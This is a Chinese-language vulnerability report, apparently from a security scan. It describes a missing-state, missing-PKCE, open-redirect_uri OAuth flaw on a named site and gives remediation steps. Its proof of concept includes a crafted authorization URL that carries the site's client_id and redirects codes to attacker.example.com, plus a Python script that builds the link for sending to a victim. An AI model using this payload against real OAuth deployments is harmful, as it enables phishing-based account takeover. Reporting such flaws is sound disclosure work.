# OAuth 授权流程缺少 state/PKCE 且可控 redirect_uri 导致授权码劫持

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-01-17 22:57:15 UTC
**Target:** https://www.h-acker.cn
**Endpoint:** /sso, /oauth/authorize
**Method:** GET
**CVSS:** 9.3

## Description

目标 SSO 授权端点（/sso -> blog.h-acker.cn/oauth/authorize）在授权请求中未使用 state 参数，也未使用 PKCE，并允许客户端任意修改 redirect_uri。攻击者可构造跨站链接，将授权请求的 redirect_uri 指向攻击者域，诱导受害者点击后，授权码将被发送到攻击者控制的回调地址，从而实现 OAuth CSRF/授权码劫持并获取受害者会话。

## Impact

攻击者可在受害者浏览器中触发授权流程并接收授权码，进一步换取访问令牌或登录会话，导致账户接管、敏感数据泄露与权限滥用。风险跨域扩散，影响所有使用该 SSO 的用户。

## Technical Analysis

授权请求参数包含固定 client_id、response_type=code、scope=openid，默认 redirect_uri=http://www.h-acker.cn/sso，但未携带 state 与 PKCE。实测将 redirect_uri 改为 https://attacker.example.com/cb 后，服务器返回 301 并保留修改后的参数，未见白名单校验或拒绝。这表明：1) 缺少 state 导致无法绑定请求与用户会话，2) 缺少 PKCE 防止代码拦截重放，3) redirect_uri 未严格校验，攻击者可指定任意域接收授权码，构成 OAuth CSRF/授权码劫持。

## Proof of Concept

1. 构造恶意授权链接（示例）：https://blog.h-acker.cn/oauth/authorize?client_id=VGgAydrlEzVFvXFbSahjdr7cjMh6TyCXsWsbbiht&redirect_uri=https://attacker.example.com/cb&response_type=code&scope=openid\n2. 将该链接放入钓鱼页面或直接发送给已登录受害者。\n3. 受害者点击后浏览器被 301 跳转，授权码被发送到攻击者控制的 https://attacker.example.com/cb。\n4. 攻击者使用截获的 code 继续兑换令牌或建立受害者会话。

```
import urllib.parse\n\nauth_base = \"https://blog.h-acker.cn/oauth/authorize\"\nparams = {\n    \"client_id\": \"VGgAydrlEzVFvXFbSahjdr7cjMh6TyCXsWsbbiht\",\n    \"redirect_uri\": \"https://attacker.example.com/cb\",\n    \"response_type\": \"code\",\n    \"scope\": \"openid\"\n}\nurl = f\"{auth_base}?{urllib.parse.urlencode(params)}\"\nprint(\"Malicious OAuth URL:\")\nprint(url)\nprint(\"Send this to a logged-in victim; the authorization code will be redirected to attacker domain.\")
```

## Remediation

1) 强制要求并验证 state，确保与用户会话绑定且随机不可预测。2) 启用并强制 PKCE（S256），验证 code_verifier 与 code_challenge。3) 对 redirect_uri 实施严格白名单与精确匹配，仅接受预注册的 HTTPS 回调。4) 拒绝缺失 state/PKCE 或未经授权的 redirect_uri 请求，并在授权前提示用户确认授权目标。

